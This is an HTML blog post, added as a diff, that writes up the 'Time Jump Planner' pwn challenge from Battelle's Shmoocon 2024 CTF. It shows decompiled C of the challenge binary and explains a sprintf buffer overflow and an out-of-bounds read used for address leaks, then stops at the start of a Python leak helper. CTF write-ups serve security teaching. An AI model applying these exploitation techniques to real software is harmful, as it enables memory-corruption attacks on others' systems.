@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>Battelle @ Shmoocon 2024</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+      <li>
+        <a href="https://tsheinen.github.io/battelle-shmoocon-2024/#time-jump-planner">Time Jump Planner</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/battelle-shmoocon-2024/#bug-review-and-building-primitives">bug review and building primitives</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/battelle-shmoocon-2024/#arbitrary-write-now-what">arbitrary write... now what?</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/battelle-shmoocon-2024/#building-the-chain">Building the chain</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/battelle-shmoocon-2024/#notes-thoughts-other-approaches">notes, thoughts, other approaches</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/battelle-shmoocon-2024/#final-script">final script</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>Battelle @ Shmoocon 2024</h1>
+    </header>
+
+    <div class="content">
+        <h1 id="time-jump-planner"><a href="/battelle-shmoocon-2024/time-jump-planner">Time Jump Planner</a></h1>
+<p>Time Jump Planner was a pwn challenge written by <a href="https://ctftime.org/user/3509">playoff-rondo</a> for Battelle's Shmoocon CTF.  I solved first :)</p>
+<p>tl;dr</p>
+<ul>
+<li>x64 running insides QEMU</li>
+<li>PIE, ASLR, Full RELRO, NX</li>
+<li>QEMU plugin enforced execve filter and shadow stack + win syscall (need to control first two arguments)</li>
+<li>PIE/libc/stack leaks, sprintf buffer overflow</li>
+<li>used <a href="https://github.com/n132/Libc-GOT-Hijacking/blob/main/Post/README.md">GOT Oriented Programming</a></li>
+</ul>
+<h3 id="bug-review-and-building-primitives">bug review and building primitives</h3>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8</span><span style="color:#ffcc66;">75  </span><span style="font-style:italic;color:#5ccfe6;">int32_t </span><span style="color:#ffd580;">main</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">int32_t</span><span> argc</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">**</span><span> argv</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">**</span><span> envp)
+</span><span>
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8</span><span style="color:#ffcc66;">75  </span><span>{
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">88a      </span><span style="color:#ffa759;">void</span><span style="color:#f29e74;">*</span><span> fsbase</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">88a      </span><span style="font-style:italic;color:#5ccfe6;">int64_t</span><span> var_10 </span><span style="color:#f29e74;">= *</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">uint64_t</span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span>)fsbase </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">89</span><span style="color:#ffcc66;">0      </span><span style="font-style:italic;color:#5ccfe6;">int32_t</span><span> year </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x7e7</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8a8      </span><span style="color:#ffa759;">void</span><span> dial</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8a8      </span><span style="color:#f28779;">memset</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>dial</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0x28</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8b4      </span><span style="color:#ffd580;">setup</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>dial)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8c3      </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Time Jump Planner v1.2&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8d5      </span><span style="color:#ffa759;">while </span><span>(</span><span style="color:#ffcc66;">true</span><span>)
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8d5      </span><span>{
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8de          </span><span style="color:#ffa759;">switch </span><span>(((</span><span style="font-style:italic;color:#5ccfe6;">int32_t</span><span>)</span><span style="color:#ffd580;">menu</span><span>(year)))
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8c8          </span><span>{
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8fe              </span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">:
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8fe              </span><span>{
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8fe                  </span><span style="color:#ffa759;">continue</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8fe              </span><span>}
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">0</span><span style="color:#ff3333;">8              </span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">:
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">0</span><span style="color:#ff3333;">8              </span><span>{
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">0</span><span style="color:#ff3333;">8                  </span><span style="color:#ffd580;">add</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>dial)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">0</span><span style="color:#ff3333;">d                  </span><span style="color:#ffa759;">continue</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">0</span><span style="color:#ff3333;">d              </span><span>}
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">16              </span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">:
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">16              </span><span>{
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">16                  </span><span style="color:#ffd580;">remove_year</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>dial)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">1</span><span style="color:#ff3333;">b                  </span><span style="color:#ffa759;">continue</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">1</span><span style="color:#ff3333;">b              </span><span>}
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">2</span><span style="color:#ff3333;">b              </span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">3</span><span style="color:#ccc9c2cc;">:
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">2</span><span style="color:#ff3333;">b              </span><span>{
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">2</span><span style="color:#ff3333;">b                  </span><span style="color:#ffd580;">quick_jump</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>dial</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f29e74;">&amp;</span><span>year)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">30                  </span><span style="color:#ffa759;">continue</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">30              </span><span>}
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">3</span><span style="color:#ff3333;">9              </span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">4</span><span style="color:#ccc9c2cc;">:
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">3</span><span style="color:#ff3333;">9              </span><span>{
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">3</span><span style="color:#ff3333;">9                  </span><span style="color:#ffd580;">manual_jump</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>year)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">3</span><span style="color:#ff3333;">e                  </span><span style="color:#ffa759;">continue</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">3</span><span style="color:#ff3333;">e              </span><span>}
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">47              </span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">5</span><span style="color:#ccc9c2cc;">:
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">47              </span><span>{
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">47                  </span><span style="color:#ffd580;">list</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>dial)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">4</span><span style="color:#ff3333;">c                  </span><span style="color:#ffa759;">continue</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">4</span><span style="color:#ff3333;">c              </span><span>}
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8fe              </span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">6</span><span style="color:#ccc9c2cc;">:
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8fe              </span><span>{
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8fe                  </span><span style="color:#ffa759;">break</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8fe                  </span><span style="color:#ffa759;">break</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8fe              </span><span>}
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8fe          </span><span>}
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">8fe      </span><span>}
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">5</span><span style="color:#ff3333;">8      </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Good Bye&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">62      </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">62      </span><span style="font-style:italic;color:#5c6773;">/* no return */
+</span><span style="color:#ffcc66;">00001</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">62  </span><span>}
+</span></code></pre>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffcc66;">000016</span><span style="color:#ff3333;">9b  </span><span style="font-style:italic;color:#5ccfe6;">int64_t </span><span style="color:#ffd580;">manual_jump</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">int32_t</span><span style="color:#f29e74;">*</span><span> arg1)
+</span><span>
+</span><span style="color:#ffcc66;">000016</span><span style="color:#ff3333;">9b  </span><span>{
+</span><span style="color:#ffcc66;">000016</span><span style="color:#ff3333;">ab      </span><span style="color:#ffa759;">void</span><span style="color:#f29e74;">*</span><span> fsbase</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000016</span><span style="color:#ff3333;">ab      </span><span style="font-style:italic;color:#5ccfe6;">int64_t</span><span> rax </span><span style="color:#f29e74;">= *</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">uint64_t</span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span>)fsbase </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000016</span><span style="color:#ff3333;">ba      </span><span style="font-style:italic;color:#5ccfe6;">int32_t</span><span> var_48 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000016</span><span style="color:#ff3333;">cb      </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Manual Jump Mode:&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000016</span><span style="color:#ff3333;">df      </span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Enter Year: &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000016</span><span style="color:#ff3333;">fa      </span><span style="font-style:italic;color:#5ccfe6;">int32_t</span><span> var_4c</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000016</span><span style="color:#ff3333;">fa      </span><span style="color:#ffd580;">__isoc99_scanf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%d%*c</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f29e74;">&amp;</span><span>var_4c)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">0000170</span><span style="color:#ff3333;">9      </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Describe location:&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">0000171</span><span style="color:#ff3333;">d      </span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\t</span><span style="color:#bae67e;">Enter number of characters of …&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">0000173</span><span style="color:#ff3333;">8      </span><span style="color:#ffd580;">__isoc99_scanf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%d%*c</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f29e74;">&amp;</span><span>var_48)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001743      </span><span style="color:#ffa759;">if </span><span>(var_48 </span><span style="color:#f29e74;">&gt; </span><span style="color:#ffcc66;">0x1e</span><span>)
+</span><span style="color:#ffcc66;">00001740      </span><span>{
+</span><span style="color:#ffcc66;">00001745</span><span>          var_48 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x1e</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001745      </span><span>}
+</span><span style="color:#ffcc66;">00001765      </span><span style="color:#ffa759;">void</span><span> var_42</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001765      </span><span style="color:#f28779;">sprintf</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>var_42</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%%%d</span><span style="color:#bae67e;">s&quot;</span><span style="color:#ccc9c2cc;">, </span><span>((</span><span style="font-style:italic;color:#5ccfe6;">uint64_t</span><span>)var_48)</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%%%d</span><span style="color:#bae67e;">s&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">0000177</span><span style="color:#ff3333;">9      </span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\t</span><span style="color:#bae67e;">Enter location: &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000017</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">1      </span><span style="color:#ffa759;">void</span><span> var_38</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000017</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">1      </span><span style="color:#ffd580;">__isoc99_scanf</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>var_42</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f29e74;">&amp;</span><span>var_38</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f29e74;">&amp;</span><span>var_38)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000017</span><span style="color:#ff3333;">ae      </span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Jumping to Year </span><span style="color:#ffcc66;">%u</span><span style="color:#bae67e;"> at </span><span style="color:#ffcc66;">%s</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">, </span><span>((</span><span style="font-style:italic;color:#5ccfe6;">uint64_t</span><span>)var_4c)</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f29e74;">&amp;</span><span>var_38)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000017</span><span style="color:#ff3333;">ba      </span><span style="color:#f29e74;">*</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">uint32_t</span><span style="color:#f29e74;">*</span><span>)arg1 </span><span style="color:#f29e74;">=</span><span> var_4c</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000017</span><span style="color:#ff3333;">bc      </span><span style="color:#f28779;">getchar</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000017</span><span style="color:#ff3333;">cf      </span><span style="color:#ffa759;">if </span><span>(rax </span><span style="color:#f29e74;">== *</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">uint64_t</span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span>)fsbase </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>))
+</span><span style="color:#ffcc66;">000017</span><span style="color:#ff3333;">c6      </span><span>{
+</span><span style="color:#ffcc66;">000017</span><span style="color:#ff3333;">d7          </span><span style="color:#ffa759;">return </span><span>(rax </span><span style="color:#f29e74;">- *</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">uint64_t</span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span>)fsbase </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>))</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000017</span><span style="color:#ff3333;">c6      </span><span>}
+</span><span style="color:#ffcc66;">000017</span><span style="color:#ff3333;">d1      </span><span style="color:#ffd580;">__stack_chk_fail</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000017</span><span style="color:#ff3333;">d1      </span><span style="font-style:italic;color:#5c6773;">/* no return */
+</span><span style="color:#ffcc66;">000017</span><span style="color:#ff3333;">d1  </span><span>}
+</span></code></pre>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffcc66;">000015</span><span style="color:#ff3333;">ae  </span><span style="font-style:italic;color:#5ccfe6;">int64_t </span><span style="color:#ffd580;">quick_jump</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">int64_t</span><span style="color:#f29e74;">*</span><span> arg1</span><span style="color:#ccc9c2cc;">, </span><span style="font-style:italic;color:#5ccfe6;">int32_t</span><span style="color:#f29e74;">*</span><span> arg2)
+</span><span>
+</span><span style="color:#ffcc66;">000015</span><span style="color:#ff3333;">ae  </span><span>{
+</span><span style="color:#ffcc66;">000015</span><span style="color:#ff3333;">c2      </span><span style="color:#ffa759;">void</span><span style="color:#f29e74;">*</span><span> fsbase</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000015</span><span style="color:#ff3333;">c2      </span><span style="font-style:italic;color:#5ccfe6;">int64_t</span><span> rax </span><span style="color:#f29e74;">= *</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">uint64_t</span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span>)fsbase </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000015</span><span style="color:#ff3333;">db      </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Quick Jump:&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000015</span><span style="color:#ff3333;">ef      </span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Index: &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">0000160</span><span style="color:#ff3333;">a      </span><span style="font-style:italic;color:#5ccfe6;">int32_t</span><span> var_14</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">0000160</span><span style="color:#ff3333;">a      </span><span style="color:#ffd580;">__isoc99_scanf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%d%*c</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f29e74;">&amp;</span><span>var_14)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">0000161</span><span style="color:#ff3333;">c      </span><span style="color:#ffa759;">if </span><span>((var_14 </span><span style="color:#f29e74;">&lt;= </span><span style="color:#ffcc66;">0xa </span><span style="color:#f29e74;">&amp;&amp;</span><span> var_14 </span><span style="color:#f29e74;">&gt;= </span><span style="color:#ffcc66;">0</span><span>))
+</span><span style="color:#ffcc66;">0000161</span><span style="color:#ff3333;">a      </span><span>{
+</span><span style="color:#ffcc66;">00001660          </span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Jumping to Year </span><span style="color:#ffcc66;">%lu</span><span style="color:#bae67e;"> at current l…&quot;</span><span style="color:#ccc9c2cc;">,</span><span> arg1[((</span><span style="font-style:italic;color:#5ccfe6;">int64_t</span><span>)var_14)])</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000016</span><span style="color:#ff3333;">8</span><span style="color:#ffcc66;">2          </span><span style="color:#f29e74;">*</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">uint32_t</span><span style="color:#f29e74;">*</span><span>)arg2 </span><span style="color:#f29e74;">= </span><span>((</span><span style="font-style:italic;color:#5ccfe6;">int32_t</span><span>)arg1[((</span><span style="font-style:italic;color:#5ccfe6;">int64_t</span><span>)var_14)])</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000016</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">2          </span><span style="color:#ffa759;">if </span><span>(rax </span><span style="color:#f29e74;">== *</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">uint64_t</span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span>)fsbase </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>))
+</span><span style="color:#ffcc66;">000016</span><span style="color:#ff3333;">89          </span><span>{
+</span><span style="color:#ffcc66;">000016</span><span style="color:#ff3333;">9a              </span><span style="color:#ffa759;">return </span><span>(rax </span><span style="color:#f29e74;">- *</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">uint64_t</span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span>)fsbase </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>))</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000016</span><span style="color:#ff3333;">89          </span><span>}
+</span><span style="color:#ffcc66;">000016</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">4          </span><span style="color:#ffd580;">__stack_chk_fail</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">000016</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">4          </span><span style="font-style:italic;color:#5c6773;">/* no return */
+</span><span style="color:#ffcc66;">000016</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">4      </span><span>}
+</span><span style="color:#ffcc66;">0000162</span><span style="color:#ff3333;">8      </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Invalid Index!&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001632      </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffcc66;">00001632      </span><span style="font-style:italic;color:#5c6773;">/* no return */
+</span><span style="color:#ffcc66;">00001632  </span><span>}
+</span></code></pre>
+<p>There are a few different bugs around but I took advantage of two in my exploit.  A sprintf buffer overflow found in manual_jump and a minor out of bounds read present in quick_jump.</p>
+<p>The buffer overread is present in most operations on the dial array. It is a bounds-checked buffer of 10 u32 numbers, however when indexed it is treated as an array of u64. The functions add, remove_year, and list all have this bug but it's not particularly useful because things are otherwise interpreted as u32 (we can leak or set the lower four bytes for a bit of the stack frame, but the shadow stack means we can't do anything interesting with the return pointer).  There is one (that I found) useful leak with this bug -- quick_jump will copy a year from the dial table to the year variable and print it as a u64.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">def </span><span style="color:#ffd580;">quick_jump_leak</span><span>(</span><span style="color:#ffcc66;">r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">index</span><span>):
